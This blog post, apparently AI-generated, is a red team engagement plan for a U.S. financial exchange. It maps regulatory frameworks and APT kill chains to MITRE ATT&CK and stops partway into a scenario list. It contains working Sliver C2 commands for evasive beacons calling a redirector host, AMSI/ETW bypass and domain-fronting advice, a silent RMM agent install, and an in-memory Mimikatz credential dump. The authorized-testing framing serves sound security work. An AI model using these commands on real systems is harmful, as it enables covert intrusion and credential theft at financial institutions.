+++
title = "Claude v Finance"
date = 2026-04-16
description = "Claude-generated Red Team engagement outline targeting a U.S. financial corporation"

[taxonomies]
categories = ["Red Team", "AI"]

+++

# Red Team Engagement Outline: Financial Exchange Organization
### U.S. Industrial Standards Alignment | Sliver C2 | Iran / Israel / Russia / DPRK / Cybercriminal APT Coverage

---

## Regulatory & Standards Framework

This engagement is structured against the full current U.S. regulatory stack for financial exchanges:

**NIST CSF 2.0 (Feb 2024)** — The primary successor to the FFIEC CAT, with roughly 81% of U.S.-based financial institutions reporting partial or full NIST CSF adoption in 2024 for mapping to FFIEC and SEC guidelines. CSF 2.0 introduces a sixth **Govern** function alongside the original five (Identify, Protect, Detect, Respond, Recover), providing the board-level accountability framework within which this engagement operates.

**FFIEC CAT Retirement (Aug 31, 2025)** — The FFIEC CAT was retired effective August 31, 2025. OCC Bulletin 2024-25 directs institutions to adopt any industry-standard cybersecurity framework — NIST CSF 2.0 and the CISA Cybersecurity Performance Goals are the recognized successors.

**NIST SP 800-115** — The federal technical standard governing the four-phase penetration test methodology used throughout this engagement. PCI DSS 4.0 explicitly cites NIST SP 800-115 as an accepted penetration testing methodology, alongside OSSTMM, OWASP, and PTES.

**NIST SP 800-53 Rev. 5** — Security control catalog for findings mapping, particularly CA-8 (Penetration Testing).

**SEC Cybersecurity Disclosure Rules (Dec 2023)** — Public companies must file current reports on material cybersecurity incidents within four business days of a materiality determination, and provide annual disclosure on risk management, strategy, and governance in their Form 10-K.

**NYDFS 23 NYCRR Part 500 (2nd Amendment, Nov 2023)** — The 2023 amendments specify that annual penetration testing must be conducted from both inside and outside the information systems' boundaries, with new requirements for monitoring privileged access and implementing endpoint detection and response solutions. Under Section 500.17(b), the annual compliance notification must be signed by both the entity's highest-ranking executive and its CISO, creating personal liability for senior leadership.

**PCI DSS 4.0 (mandatory Mar 31, 2025)** — Requirement 11.3.1 mandates external network penetration tests of internet-facing environments at least annually; internal tests are required under 11.3.2.

**CRI Cyber Profile 2.0** — The Cyber Risk Institute's financial-sector extension of NIST CSF, knitting together 2,500 regulatory expectations in 318 control objectives and mapping directly to MITRE ATT&CK v16.1.

---

## Phase 1 — Pre-Engagement: Governance & Authorization

### 1.1 Legal Authorization & Rules of Engagement

All testing requires written authorization under the **Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030)** before any active activity begins. Required documents:

- **Master Service Agreement (MSA)** with indemnification and liability caps
- **Scope of Work (SOW)** defining in-scope systems, IP ranges, personas, and excluded targets
- **Rules of Engagement (RoE)** specifying blackout windows (market hours, settlement cycles), emergency stop/kill-switch procedures, and escalation contacts
- **CFAA Authorization Letter** signed by an authorized officer explicitly permitting simulated attacks
- **Deconfliction Protocol** for coordinating with the SOC and any regulators monitoring the target during the engagement period

### 1.2 Control Team Structure

- **White Cell** — CISO + Legal + designated board member; only internal parties who know the test is live
- **Red Team** — External provider conducting adversarial simulation
- **Blue Team** — SOC and defenders with no knowledge of the engagement (covert phase); joined later for purple team

### 1.3 Crown Jewel Asset Register

*(Aligned to NIST CSF 2.0 ID.AM and NYDFS §500.13)*

- Trade Order Management System (OMS) and matching engine
- SWIFT/FIN messaging endpoints and connectivity
- Clearing & Settlement (CCP processing layer)
- Market data dissemination feeds
- Internal Certificate Authority and PKI
- Active Directory / Entra ID backbone
- Privileged Access Workstations (PAWs) and jump hosts
- Backup and DR systems

---

## Phase 2 — Threat Intelligence Report

Produced prior to active testing per **NIST SP 800-30 Rev. 1** (Risk Assessment) and **NIST CSF 2.0 ID.RA**. Satisfies NYDFS §500.9 risk assessment requirements and NIST 800-53 RA-3.

Between April 2024 and April 2025, analysts observed 6,406 dark web forum posts pertaining to financial sector access listings, with ransomware attacks, initial access brokers, third-party compromises, and insider threats among the primary documented attack vectors.

The report covers:

- Active APT groups with financial exchange TTPs (Phases 3–7)
- Recently weaponized CVEs against FSI targets
- OSINT: public-facing infrastructure, employee exposure, dark web credential listings
- MITRE ATT&CK v16.1 Navigator threat heatmap for the target
- Risk scoring using NIST SP 800-30 likelihood × impact methodology

---

## Phase 3 — C2 Infrastructure: Sliver Framework

### Why Sliver

Sliver is an open-source cross-platform adversary emulation/red team framework developed by BishopFox. Implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS, and are dynamically compiled with per-binary asymmetric encryption keys. The server and client support macOS, Windows, and Linux.

Importantly, APT29 (Cozy Bear) has used Sliver in intrusion campaigns to build robust C2 infrastructures — making Sliver emulation highly realistic for financial exchange red team scenarios.

### Infrastructure Architecture

```
[Operators] --> [Sliver Team Server] --> [Nginx/Apache Redirectors] --> [Implants on Target]
```

Sliver implements a distributed architecture that clearly separates server, client, and operator components, allowing maximum operational flexibility. Redirectors should be positioned between the server backend and implants to protect team server identity.

### C2 Channel Selection by Scenario

| Protocol | Use Case | Sliver Command |
|---|---|---|
| **HTTPS** | Primary exfiltration channel; blends with web traffic through Nginx redirector | `sliver> https --lhost 0.0.0.0 --lport 443 --domain <c2_domain>` |
| **mTLS** | Encrypted internal pivot channel; mutual certificate auth | `sliver> mtls --lhost 0.0.0.0 --lport 8888` |
| **WireGuard** | Stealthy tunnel for long-dwell operations; VPN-like encapsulation | `sliver> wg --lport 53` |
| **DNS** | Egress through restrictive firewalls; slow beacon for low-noise ops | `sliver> dns --domains <c2_domain>` |

### Implant Generation

**Primary Windows HTTPS beacon (staged, evasive):**

```bash
# Create reusable beacon profile
sliver> profiles new beacon --http https://sliver-redirector.com \
  --os windows --format shellcode --evasion https-win

# Generate staged beacon with gzip + AES-encrypted stage-1
sliver> stage-listener --url http://sliver-domain:80 --profile https-win \
  --compress gzip --aes-encrypt-key "<key>" --aes-encrypt-iv "<iv>"
```

**Multi-channel failover beacon (mTLS → HTTPS → DNS):**

```bash
sliver> generate --mtls <ip>:8888 --http <c2_domain> --dns <c2_domain> \
  --os windows --arch amd64 --format shellcode --evasion
```

**Long-dwell beacon with jitter (APT persistence emulation):**

```bash
sliver> profiles new beacon --http https://sliver-redirector.com \
  --os windows --format exe --name apt-persist
sliver> profiles beacon-interval --profile apt-persist --seconds 3600 --jitter 30
```

**Linux implant for server-side pivot:**

```bash
sliver> generate beacon --http https://sliver-redirector.com \
  --os linux --arch amd64 --evasion --save /output/
```

### Redirector Configuration (Nginx)

```nginx
location / {
    proxy_pass https://<sliver-teamserver-ip>:443;
    proxy_ssl_verify off;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}
```

Team server firewall rules — only accept connections from redirector:

```bash
iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j DROP
```

### Operational Notes

- Default Sliver HTTPS listeners use a recognizable certificate chain (US cities + "CN = localhost") and produce a characteristic 400 error on malformed requests — operators must replace with custom certificates and configure domain fronting via Cloudflare or CDN to avoid JARM fingerprinting.
- Use `Donut` or `Scarecrow` to wrap Sliver shellcode output with AMSI/ETW bypass before deployment.
- Sliver supports Windows process migration, process injection, and user token manipulation natively — use these for post-exploitation rather than external tools where possible to reduce tooling footprint.
- Armory package manager provides integrated BOF extensions: `armory install sa-ldapsearch` for AD enumeration without dropping SharpHound to disk.

### Multiplayer Operator Configuration

```bash
# On team server — generate per-operator configs
sliver-server operator --name operator1 --lhost <team_server_ip>

# On operator machine — import and connect
sliver-client import operator1.cfg
sliver-client
```

---

## Phase 4 — Threat Actor Emulation: APTs & Kill Chains (2023–2025)

All scenarios are driven by the Threat Intelligence Report and mapped to **MITRE ATT&CK for Enterprise v16.1** and **NIST 800-53 Rev. 5** control families.

---

### APT 1 — Lazarus Group / APT38 / TraderTraitor (DPRK)
**Risk Rating: Critical | MITRE: G0032 / G0082 | Sponsor: Reconnaissance General Bureau**

APT38 has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide, with significant operations including the 2016 Bank of Bangladesh heist ($81 million stolen).

**2024–2025 Activity:**

- In February 2025, a Lazarus subgroup created a counterfeit wallet management interface, deceiving Bybit executives into authorizing the transfer of over 400,000 ETH from cold storage — the largest crypto heist in history at $1.5 billion.
- In 2024, Lazarus exploited CVE-2024-38193 (Windows AFD.sys zero-day) for SYSTEM-level access and CVE-2024-21338 (Windows kernel flaw, CVSS 7.8) for privilege escalation.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Reconnaissance | Fake LinkedIn recruiter profiles ("Operation Dream Job") | T1591.004, T1598 | OSINT / Gophish persona |
| Initial Access | Trojanized job offer docs; watering-hole on financial portals | T1566.001, T1189 | Sliver HTTPS beacon in weaponized doc |
| Execution | DLL sideloading via malicious macro chain | T1055.001 | `sideload` module |
| Persistence | Registry run keys; scheduled tasks | T1547.001, T1053.005 | `registry write`; `task-scheduler` |
| Privilege Escalation | CVE-2024-38193 / CVE-2024-21338 BYOVD | T1068 | BYOVD harness + Sliver token manipulation |
| Defense Evasion | BYOVD; anti-forensic wipers post-exfil | T1014, T1561.002 | Sliver `execute-assembly` + custom wiper |
| Credential Access | KiloAlfa keylogger; `CreateProcessAsUserA` token theft | T1056.001, T1134.002 | `token steal`; `execute-assembly Seatbelt` |
| Lateral Movement | Pass-the-hash; LOLBins | T1550.002, T1218 | Sliver `psexec`; `wmiexec` |
| Impact | Fraudulent SWIFT MT103 staging; cold wallet UI spoofing | T1657, T1041 | Sliver WireGuard tunnel to SWIFT endpoint |

**NIST 800-53 Controls Tested:** AC-2, AC-17, SI-3, SI-4, AU-12, IR-4, SC-7

---

### APT 2 — APT34 / OilRig / Hazel Sandstorm (Iran — MOIS / IRGC-linked)
**Risk Rating: Critical | MITRE: G0049 | Sponsor: Iranian Ministry of Intelligence**

OilRig (APT34) primarily conducts cyber espionage targeting government entities, financial services, telecommunications, defense contractors, and energy organizations, particularly in the Middle East. The group commonly relies on spear-phishing campaigns, credential harvesting, and exploitation of internet-facing applications for initial access, followed by custom backdoors and web shells to maintain persistence.

**2024–2025 Activity:**

Beginning in September 2024, APT34 intensified operations through a multi-stage intrusion campaign deploying novel malware families including the Veaty and Spearal backdoors. By late 2024 and into early 2025, a renewed campaign introduced C# malware masquerading as PDF documents, incorporating anti-VM checks, timestamp manipulation, and dual C2 channels combining HTTP through European servers hidden behind fake 404 error pages with email-based control using compromised government accounts — commands concealed within Authorization Bearer tokens.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Reconnaissance | Target research on financial employees; infrastructure enumeration | T1591, T1590 | OSINT + Nuclei external scan |
| Initial Access | Spear-phishing with malicious PDF/C# payload masquerading as regulatory document | T1566.001 | Sliver beacon embedded in lure PDF |
| Execution | PowerShell download cradle; macro execution | T1059.001 | Sliver `execute -o powershell` |
| Persistence | Web shells (HyperShell, HighShell); scheduled tasks | T1505.003, T1053 | Sliver HTTP reverse shell + `task-scheduler` |
| Defense Evasion | Command obfuscation; fake 404 C2 pages; Bearer token C2 exfil | T1027, T1001.003 | Custom Sliver HTTP profile with 404 responses |
| Credential Access | Mimikatz; LaZagne; credential-filter DLLs | T1003, T1555 | Sliver `sideload mimikatz.dll` |
| Lateral Movement | Cloud service abuse (OneDrive/Exchange Online as C2) | T1567, T1114.002 | Sliver pivot + cloud enumeration |
| Exfiltration | Long-term credential/data exfil to cloud storage | T1567.002 | Sliver WireGuard tunnel |

**Notable CVEs for Scenario Use:**

- CVE-2024-30088 (Windows Kernel privilege escalation, exploited by APT34)
- CVE-2017-11882 (Office Equation Editor, still weaponized in lure docs)

**NIST 800-53 Controls Tested:** SI-3, SI-4, AC-17, IA-5, AU-12, SC-28

---

### APT 3 — APT35 / Charming Kitten / Mint Sandstorm (Iran — IRGC)
**Risk Rating: High | MITRE: G0059 | Sponsor: Islamic Revolutionary Guard Corps**

CloudSEK analyzed a credible leak of Charming Kitten operational materials documenting coordinated teams for penetration, malware development, social engineering, and infrastructure compromise, including rapid exploitation of CVE-2024-1709 and mass router DNS manipulation. Victims include government, legal, academic, aviation, energy, and financial sectors across the Middle East, with regions of interest including the US and Asia.

**2024–2025 Activity:**

APT35 sustained a continuous, technically evolving campaign of cyber espionage from late 2024 through 2025, beginning with BellaCPP — a C++ reimplementation of the BellaCiao .NET implant — alongside the PowerLess backdoor updated to version 3.3.4 with AMSI and ETW bypass techniques, AES-encrypted payloads via malicious LNK files, and Telegram-based command-and-control communication.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | Spear-phishing with password-protected RAR containing malicious LNK; AI-generated decoy PDFs | T1566.001, T1204.002 | Sliver staged payload in LNK file |
| Execution | PowerLess backdoor (PowerShell + AMSI bypass); BellaCPP C++ implant | T1059.001 | Sliver shellcode wrapped with Scarecrow AMSI bypass |
| Persistence | Winlogon registry modification | T1547.004 | `registry write HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` |
| Credential Access | Custom Chromium-based credential stealer (Chrome, Edge, Brave, Opera) | T1555.003 | Sliver `execute-assembly` + custom stealer BOF |
| Defense Evasion | EDR evasion via C++ re-implementation; supply chain pivots | T1027, T1195 | Sliver `--evasion` flag + custom shellcode loader |
| C2 | Telegram API; Dropbox; Google Drive; Backblaze; IPFS | T1102, T1567 | Sliver DNS beacon as fallback to cloud C2 |
| Lateral Movement | AD domination; supply-chain pivots via compromised IT providers | T1484, T1195.002 | Sliver `psexec`; BloodHound path exploitation |

**NIST 800-53 Controls Tested:** SI-3, SI-4, IA-2, IA-5, SC-7, AC-3

---

### APT 4 — APT33 / Refined Kitten / Peach Sandstorm (Iran — IRGC-linked)
**Risk Rating: High | MITRE: G0064 | Focus: Financial infrastructure disruption**

Password spraying has become APT33's primary initial access method since 2023, targeting Microsoft 365 and Entra ID at scale using go-http-client through TOR exit nodes. The group has expanded beyond traditional espionage to focus on satellite communications and critical infrastructure.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | Large-scale M365/Entra ID password spraying via TOR | T1110.003 | External spray tool + Sliver beacon on success |
| Persistence | Azure infrastructure abuse; legitimate admin tool persistence | T1078.004 | `AADInternals` device enrollment + Sliver implant |
| Lateral Movement | Cloud tenant pivoting; service principal abuse | T1538, T1098.001 | ROADtools + Sliver HTTPS beacon |
| Impact | Pre-positioned access for destructive wiper deployment | T1485 | Sliver `execute-assembly` wiper simulation |

---

### APT 5 — MuddyWater / Mango Sandstorm / TA450 / Seedworm (Iran — MOIS)
**Risk Rating: Critical | MITRE: G0069 | Sponsor: Iranian Ministry of Intelligence and Security (MOIS)**

MuddyWater is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS). Since at least 2017, MuddyWater has targeted a range of government and private organizations across sectors including telecommunications, local government, defense, oil and natural gas, and financial organizations in the Middle East, Asia, Africa, Europe, and North America.

CISA has stated MuddyWater actors are "positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors" — making this group particularly dangerous as both a direct threat and an **access broker** feeding other IRGC-affiliated groups such as Storm-1084/DarkBit.

**2024–2025 Activity Directly Relevant to Financial Sector:**

- A sophisticated spear-phishing campaign attributed to MuddyWater actively compromised CFOs and finance executives across Europe, North America, South America, Africa, and Asia. The attackers impersonated recruiters from Rothschild & Co, deploying Firebase-hosted phishing pages with custom CAPTCHA challenges to lend legitimacy. Payloads abused legitimate remote-access tools including NetBird and OpenSSH to establish persistent RDP access and automated scheduled tasks.
- Symantec/Carbon Black flagged suspicious MuddyWater-linked activity on the networks of a U.S. bank, a software company, an airport, and NGOs in the U.S. and Canada — the single most significant indicator of MuddyWater financial sector penetration in the 2024–2026 window.
- BugSleep, a new tailor-made backdoor deployed in MuddyWater phishing lures since May 2024, has partially replaced legitimate RMM tools. Multiple versions were distributed in rapid succession showing active development; the backdoor begins with multiple Sleep API calls to evade sandboxes, creates a mutex, decrypts its C2 configuration, and executes threat actor commands while transferring files between the compromised machine and C2.
- MuddyWater adopted DarkBeatC2 — a previously unreported C2 framework identified in early 2024 — built on PowerShell with Tactical RMM and Atera Agent abuse. The framework manages infected endpoints via PowerShell connections established after initial access through spear-phishing, DLL sideloading, or Windows Registry AutodialDLL abuse.
- MuddyWater deployed Mimikatz via a custom loader and injector in a 2024 campaign, after which the group may have handed off harvested credentials to Lyceum (another Iran-aligned group), with researchers noting MuddyWater may be acting as an access broker for other Iran-aligned threat actors.

**C2 Framework Evolution (2017 → 2025):**

| Year | Framework | Notes |
|---|---|---|
| 2017–2020 | POWERSTATS | PowerShell-based signature backdoor |
| 2020–2023 | RMM Abuse (Atera, ScreenConnect, SimpleHelp, N-able) | Legitimate tools to blend with enterprise traffic |
| 2023 | PhonyC2 → MuddyC2Go | Python → Golang C2 evolution |
| Early 2024 | DarkBeatC2 | PowerShell-based; Registry AutodialDLL sideloading |
| May 2024–Present | BugSleep / RustyWater | Custom C backdoor; RustyWater is a Rust-based RAT deployed in early 2026 targeting Israeli government, military, financial, telecommunications, and maritime organizations |

**Kill Chain (MITRE ATT&CK Mapped):**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Reconnaissance | Sector-specific OSINT; identify CFOs, finance executives, IT contacts at target exchange | T1591.004, T1589.002 | OSINT via theHarvester, LinkedIn, FOCA |
| Initial Access | Spear-phishing from compromised organizational email accounts; lures themed as regulatory compliance docs, webinar invites, or financial recruiter outreach | T1566.001, T1566.002 | Gophish with Rothschild/regulatory lure templates; Sliver beacon in payload |
| Execution | BugSleep backdoor injected into target process via WriteProcessMemory/CreateRemoteThread; macro-enabled Office documents; VBS scripts dropping RMM installers | T1059.001, T1059.005, T1204.002 | Sliver shellcode wrapped in custom injector; `execute-assembly` for .NET payloads |
| Persistence | Scheduled tasks (BugSleep persistence method); Registry run keys; Winlogon hijack via AutodialDLL | T1053.005, T1547.001, T1574.012 | `task-scheduler` via Sliver; `registry write` |
| Defense Evasion | Sleep API sandbox evasion; DLL sideloading (PowGoop masquerading as GoogleUpdate.exe); C2 infrastructure limited to a few days uptime to hinder attribution; obfuscated PowerShell | T1497.003, T1574.002, T1027 | Sliver `--evasion` flag; beacon jitter `--seconds 3600 --jitter 30` mimicking infrastructure rotation |
| Credential Access | Mimikatz via custom loader/injector; LaZagne; browser credential theft | T1003.001, T1555.003 | Sliver `sideload mimikatz.dll`; BOF credential harvester |
| Lateral Movement | Legitimate RMM tool abuse (Atera, AnyDesk, SimpleHelp, NetBird, ConnectWise ScreenConnect, PDQ) for hands-on keyboard sessions; WMI; pass-the-hash | T1219, T1047, T1550.002 | Sliver `wmiexec`; `portfwd` for RDP via WireGuard; NetExec |
| Collection | File staging via BugSleep file transfer; cloud service abuse (Egnyte subdomains mimicking target company names); Telegram Bot API C2 (Small Sieve) | T1074.001, T1567.002, T1102 | Sliver DNS tunnel for low-noise exfil staging |
| Exfiltration | HTTPS upload via DarkBeatC2 or RMM file transfer; Egnyte/OneDrive abuse | T1567.002, T1041 | Sliver WireGuard tunnel or DNS beacon |
| Access Brokering | Credential hand-off to other IRGC/MOIS-aligned groups (observed Lyceum/Storm-1084 hand-offs) | T1078 | Not directly emulated; document as finding if credentials reach crown jewel level |

**Notable CVEs for Scenario Use:**

- CVE-2024-1709 — ConnectWise ScreenConnect auth bypass (documented in Charming Kitten leaked materials and MuddyWater infrastructure overlap)
- CVE-2023-27350 — PaperCut RCE (exploited by MuddyWater for server-side initial access)
- CVE-2020-1472 — Zerologon (used in post-exploitation privilege escalation)

**Financial Sector Specific Concern — CFO / Finance Executive Targeting:**

Infrastructure analysis reveals consistent use of Firebase-hosted phishing pages, evolving C2 IP addresses, and identical NetBird setup keys across campaigns — indicating a persistent, operationally disciplined adversary adapting to detection while retaining core targeting of financial decision-makers. For a financial exchange, this translates to a direct threat to individuals with trade authorization, settlement approval authority, and access to SWIFT messaging credentials.

**Sliver-Specific Emulation Notes:**

MuddyWater's hallmark RMM-abuse pattern is best emulated using Sliver's built-in persistence combined with a simulated RMM agent installation:

```bash
# Simulate RMM-based persistence (Atera/SimpleHelp pattern)
# Stage 1: Deliver Sliver HTTPS beacon via phishing lure
sliver> profiles new beacon --http https://sliver-redirector.com \
  --os windows --format shellcode --evasion mw-rmm-profile

# Stage 2: Post-access — simulate RMM agent registration for persistence
sliver (SESSION)> execute -o cmd.exe /c "msiexec /i AteraAgent.msi /quiet"

# Simulate BugSleep sleep-evasion behavior via beacon jitter
sliver> profiles beacon-interval --profile mw-rmm-profile \
  --seconds 7200 --jitter 600   # Long beacon interval, high jitter

# Simulate DarkBeatC2 PowerShell C2 pattern
sliver (SESSION)> execute-assembly /tmp/PowerShellRunner.exe \
  -EncodedCommand <base64-obfuscated-PS>

# Simulate Mimikatz via custom loader (no disk drop)
sliver (SESSION)> sideload /tmp/mimikatz.dll sekurlsa::logonpasswords
```

**NIST 800-53 Controls Tested:** AC-2, AC-17, IA-5, SI-3, SI-4, SC-7, AU-12, IR-4, SA-9 (third-party risk — RMM abuse), CA-8

**Key Detection Gaps to Validate:**

- Detection of unauthorized RMM tool installations (Atera, SimpleHelp, NetBird, PDQ) — NYDFS §500.14(b) EDR requirement
- Alerting on PowerShell download cradles executed from unusual parent processes
- Network baseline for legitimate vs. unauthorized use of WireGuard UDP/51820 and RMM agent beacon traffic
- Email security controls against phishing from **compromised legitimate organizational email accounts** (SPF/DKIM pass → MuddyWater's primary delivery method bypasses standard email filtering)

---

### APT 6 — Predatory Sparrow / Gonjeshke Darande (Israel — Likely Unit 8200 affiliated)
**Risk Rating: High | Focus: Financial infrastructure destruction and disruption**

On June 17, 2025, shortly after Israeli airstrikes against Iran, Predatory Sparrow claimed a cyberattack on Iran's state-owned Bank Sepah, causing widespread service outages and claiming to have destroyed the bank's data. The group also claimed responsibility for an attack on the Iranian cryptocurrency exchange Nobitex the following day, stealing $90 million in crypto assets and then destroying the funds by sending them to inaccessible addresses.

**Relevance to U.S. Exchange Red Team:** Predatory Sparrow's TTPs — infrastructure-layer destruction combined with financial data exfiltration and transaction system disruption — are the highest-fidelity public template for what a destructive state-level attack on a financial exchange looks like. Any U.S. exchange with Israeli vendor relationships, Israeli-licensed technology, or geopolitically exposed market participants should model against this profile.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Reconnaissance | Deep intelligence gathering on target financial infrastructure topology | T1590, T1591 | OSINT + Shodan/Censys mapping |
| Initial Access | Likely supply chain / insider access to core banking/exchange systems | T1195.002, T1078 | Sliver beacon via compromised vendor credential |
| Execution | Destructive wiper payload deployment to banking transaction systems | T1485, T1561.002 | Sliver `execute-assembly` wiper simulation (non-destructive flag) |
| Impact | Data destruction + transaction system disruption + crypto asset drain | T1657, T1490 | Crown jewel access demonstration; SWIFT staging |

**NIST 800-53 Controls Tested:** CP-9, CP-10, SI-12, IR-4, IR-6, SC-28

---

### APT 7 — APT29 / Midnight Blizzard / Cozy Bear (Russia — SVR)
**Risk Rating: Critical | MITRE: G0016 | Sponsor: Foreign Intelligence Service (SVR)**

APT29 has shifted from traditional malware-heavy operations toward cloud-native tradecraft, heavily targeting identity systems, OAuth applications, and federated trust configurations to move laterally without deploying detectable payloads. High-profile intrusions include the SolarWinds supply chain compromise (2020) and the Microsoft corporate breach (January 2024).

APT29 has used Sliver in their intrusion campaigns to build out robust C2 infrastructures — making Sliver the precisely correct tool for emulating this actor's tradecraft.

**2024–2025 Activity:**

WINELOADER was attributed with high confidence to APT29 in November 2024. The backdoor employs re-encryption and zeroing of memory buffers to guard sensitive data in memory and evade forensics; C2 servers only respond to specific request types at certain times to prevent automated analysis from retrieving C2 responses.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | Spear-phishing with ROOTSAW dropper → WINELOADER second-stage | T1566.001 | Sliver HTTPS beacon deployed via ROOTSAW-style dropper |
| Execution | WINELOADER via DLL sideloading from legitimate binary | T1574.002 | Sliver `sideload` module |
| Persistence | Multiple redundant implants; cloud service C2 (OneDrive, Graph API) | T1078.004, T1567.002 | Sliver beacon + Graph API exfil tunnel |
| Defense Evasion | Time-gated C2 (server only responds at specific hours); memory zeroing; residential proxy rotation | T1027, T1090.002 | Sliver `beacon-interval` + jitter config; redirector with time-based allow rules |
| Lateral Movement | OAuth token abuse; federated identity exploitation; service account Kerberoasting | T1528, T1558.003 | Sliver + AADInternals OAuth token extraction; Rubeus Kerberoast |
| Collection | Cloud resource enumeration; M365 mail access | T1114.002, T1530 | ROADtools + Sliver execute-assembly |
| Exfiltration | Low-and-slow exfil via legitimate cloud services | T1567.002 | Sliver DNS/WireGuard tunnel |

**NIST 800-53 Controls Tested:** IA-8, AC-3, SC-7, AU-2, SI-4, IR-4

---

### APT 8 — APT28 / Fancy Bear / Forest Blizzard (Russia — GRU Unit 26165)
**Risk Rating: High | MITRE: G0007 | Sponsor: GRU Military Intelligence**

The FBI warned that Russia's GRU via APT28 has been exploiting TP-Link routers via CVE-2023-50224 since at least 2024, changing device settings to introduce attacker-controlled DNS resolvers and set up adversary-in-the-middle attacks against encrypted traffic. The GRU also engaged in credential-targeting phishing campaigns against European government entities, leveraging VPNs, Tor, data center IPs, and compromised EdgeOS routers to anonymize operations.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | Spear-phishing for credential harvest; compromised SOHO router DNS hijacking | T1566, T1557.001 | Evilginx2 AiTM + Sliver beacon on credential capture |
| Persistence | Implants on edge routers; legitimate credentials from credential spray | T1078, T1505 | Sliver implant on compromised network device |
| Lateral Movement | Credential reuse; LOLBins | T1550.002, T1218 | Sliver `psexec`; NetExec pass-the-hash |
| Collection | Credential harvesting from M365; email exfiltration | T1114.002 | Sliver + AADInternals |
| Defense Evasion | Tor/VPN/data center IP anonymization; living-off-the-land | T1090, T1036 | Sliver with redirectors behind Cloudflare |

**NIST 800-53 Controls Tested:** IA-5, SC-7, AU-12, SI-4, AC-17

---

### APT 9 — Scattered Spider / UNC3944 (Cybercriminal, English-speaking)
**Risk Rating: High | Focus: Cloud financial infrastructure**

A notable long-term Scattered Spider campaign targeted cloud infrastructures within insurance and financial sectors through mid-2024, leveraging ransomware strains including RansomHub, BlackCat, and Qilin alongside custom phishing pages impersonating internal portals and Okta/MFA prompts.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | SMS vishing / help desk social engineering; SIM-swap | T1598.004, T1566.004 | Voice phishing scripts; Sliver beacon after MFA reset |
| Persistence | Attacker MFA device enrollment via help desk reset | T1098.005 | Sliver implant + AADInternals device enrollment |
| Privilege Escalation | MFA push fatigue; Azure AD conditional access bypass | T1621 | Evilginx2 MFA bypass + Sliver HTTPS |
| Lateral Movement | Azure AD → M365 → SharePoint → OneDrive | T1538, T1530 | Sliver + ROADtools |
| Impact | RansomHub/BlackCat deployment; double extortion | T1486, T1657 | Simulated ransomware staging (no encryption executed) |

---

### APT 10 — RansomHub (RaaS Affiliate)
**Risk Rating: High | Focus: Financial sector volume targeting**

Emerging in February 2024, RansomHub became the second-most active ransomware group that year, claiming 38 victims in the financial sector between April 2024 and April 2025, with known TTPs including phishing and exploiting public-facing vulnerabilities.

**Kill Chain:**

| Phase | TTP | MITRE ID | Sliver Emulation |
|---|---|---|---|
| Initial Access | Fortinet, Citrix, VPN CVE exploitation | T1190 | Metasploit + Sliver beacon on shell |
| Defense Evasion | EDRKillShifter — BYOVD to disable EDR | T1562.001 | BYOVD simulation + Sliver evasion flags |
| Lateral Movement | RDP pivoting; credential reuse | T1021.001 | Sliver `portfwd`; NetExec |
| Impact | Double extortion: exfil + encryption | T1486, T1657 | Crown jewel access + staged exfil demo |

---

## Phase 5 — Attack Execution Methodology

Execution follows **NIST SP 800-115 four phases**: Planning → Discovery → Attack → Reporting.

### 5.1 Reconnaissance
*(CSF 2.0: Identify | NIST 800-53: RA-2, RA-3)*

**Passive:**

- `Shodan` / `Censys` — Exposed services, banners, TLS certificates
- `crt.sh` — Certificate Transparency subdomain enumeration
- `theHarvester` / `FOCA` — Employee names, email patterns, document metadata
- LinkedIn org mapping — High-value personnel, technology stack inference from job postings
- Dark web monitoring — Access broker listings, existing credential dumps for target domain

**Active (within authorized scope):**

- `Nmap` / `Masscan` — Service fingerprinting
- `Nuclei` — Automated CVE detection; financial-specific templates (Citrix, Fortinet, Exchange, ConnectWise)
- `Aquatone` — Visual recon of web attack surface

### 5.2 Initial Access Scenarios

**Scenario A — Spear Phishing (Lazarus / APT34 / APT35 / MuddyWater emulation)**
Craft themed lures: SEC/DORA compliance notices, regulatory update PDFs, spoofed vendor invoices, fake job offers, financial recruiter outreach. Deliver via `Gophish` with AiTM proxy (`Evilginx2`). Payload: staged Sliver HTTPS beacon wrapped in `Donut`/`Scarecrow` shellcode loader.

**Scenario B — External Vulnerability Exploitation (RansomHub / APT35 emulation)**
Target Citrix NetScaler (CVE-2023-4966), Fortinet (CVE-2023-48788), ConnectWise (CVE-2024-1709), PaperCut (CVE-2023-27350). Deploy Sliver beacon on successful shell.

**Scenario C — Supply Chain / Third-Party (APT29 / Lazarus / MuddyWater emulation)**
Simulate compromise of a trading ISV, clearing system vendor, managed service provider, or IT support firm (replicating MuddyWater's "Rashim" IT provider pattern). Sliver beacon deployed via vendor access credential; pivot into exchange network.

**Scenario D — Help Desk Social Engineering (Scattered Spider emulation)**
Voice vishing targeting IT help desk for MFA device enrollment or password reset. Sliver HTTPS beacon deployed post-takeover.

**Scenario E — Password Spray / Cloud Identity (APT33 emulation)**
Large-scale M365 / Entra ID password spray through TOR exit nodes. On success, deploy Sliver beacon; enumerate cloud tenant via `AADInternals` and `ROADtools`.

**Scenario F — RMM Tool Abuse (MuddyWater emulation)**
